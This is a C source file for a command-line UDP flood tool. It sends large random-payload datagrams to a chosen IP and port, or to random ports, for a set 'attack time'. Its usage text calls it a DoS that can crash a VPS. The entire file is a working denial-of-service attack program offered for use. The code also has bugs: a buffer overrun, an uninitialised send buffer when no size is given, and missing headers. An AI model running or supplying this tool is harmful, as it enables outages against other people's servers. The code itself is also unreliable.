#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <ctype.h>
#include <getopt.h>

int mc = 0;

char * random_string(int x)
{
        char * p = (char *) malloc(x);
        int y = 0;

        memset((char *)p, 0, x);

        if(p == NULL)
        {
                printf("Error allocating memory?\n");
                exit(0);
        }
        while(y < x)
        {
                //srand(time(NULL));
                p[y] = (char) rand() % 255;
                y++;
        }
        p[x] = '\0';
        return p;
}


int main(int argc, char *argv[])
{
        int sd; int c; c = 0;
        int port=0, packet_size=0, attack_time=0;
        int ipflag = 0, portflag = 0, sizeflag = 0, timeflag = 0;
        char * send_data; int tport, tsize;
        struct sockaddr_in info;
        int random, res;
        char ip[20];
        time_t cur_time;

//      char * send_data;
        //printf("Can we get a response in here?\n");

        if(argc == 1)
        {
                printf("");
                printf("");


                printf("%s: -i 127.0.0.1 -p 80 -s 40000 -t 30\n", argv[0]);

                printf("-i\t= IP (v4) [REQUIRED]\n");
                printf("-p\t= UDP Port (65535 or less)\n");
                printf("-s\t= Packet Size (32000 or dos will crash vps)\n");
                printf("-t\t= Attack time in seconds [Default: 60]\n");
                exit(0);
        }


        while((res = getopt(argc, argv, "i:p:s:t:")) != -1)
        { //ip, port, size time
                switch(res)
                {
                        case 'i':
                                strncpy(ip, optarg, sizeof(ip));
                                ipflag = 1;
                                break;
                        case 'p':
                                port = atoi(optarg);
                                portflag = 1;
                                break;
                        case 's':
                                packet_size = atoi(optarg);
                                sizeflag = 1;
                                break;
                        case 't':
                                attack_time = atoi(optarg);
                                timeflag = 1;
                                break;
                        default:
                                exit(0);
                }
        }

//      printf("IP: %s\nPort: %d\nPacket size: %d\nTime: %d\n", ip, port, packet_size, attack_time);

        if(ipflag == 0)
        {
                printf("You need to set an IP address.\n");
                exit(0);
        }

        if(sizeflag == 1)
        {
                if(packet_size > 65500)
                {
                        printf("Packet size is over 65500..\n");
                        exit(0);
                }
        }

        sd = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if(sd == -1)
        {
                perror("socket");
                exit(0);
        }

        info.sin_family = AF_INET;
        info.sin_addr.s_addr = inet_addr(ip);
        if(portflag == 1)
        {
                info.sin_port = htons(port);
        }

        if(info.sin_addr.s_addr == (in_addr_t) -1)
        {
                printf("Error: Invalid ip address (Should be X.X.X.X with all numbers 255 or less)\n");
                exit(0);
        }

        if(timeflag == 0)
        {
                attack_time = 60;
        }
        else
        {
/*                if(attack_time > 999999999)
                {
                        printf("Error: To long of a attack\n");
                        exit(0);
                }*/
        }

        if(sizeflag == 0)
        {
                //tsize = 32000;
                packet_size = 32000;
        }

        attack_time += (int) time(NULL);
        cur_time = time(NULL);

        while(cur_time <= (time_t) attack_time)
        {

//                *send_data = 0x00000000;

                srand(time(NULL));

                if(portflag == 0)
                {
//                      srand(time(NULL));
                        random = (rand() % 65534) + 1;
                        tport = random;
//                      info.sin_port = htons(random);
                }
                else
                {
                        tport = port;
                }

/*                if(sizeflag == 0)
                {
//                      srand(time(NULL));
                        random = (rand() % 960 ) + 64;
                        tsize = random;
                        send_data = random_string(random);
                }*/
                if(sizeflag == 1)
                {
//                      srand(time(NULL));
                        send_data = random_string(packet_size);
                        tsize = packet_size;
                }

                info.sin_port = htons(tport);

                if(sendto(sd, send_data, tsize, 0, (struct sockaddr *) &info, sizeof(info)) < 0)
                {
                        perror("sendto");
                        exit(0);
                }

                //printf("%d\n", mc);

//              printf("%d|%d|%d\n", (int) (attack_time-cur_time), tport, tsize);

//              sleep(1);

                free(send_data);
                cur_time = time(NULL);
                mc++;
        }
        close(sd);

        printf("Sent %d packets!\n", mc);
}

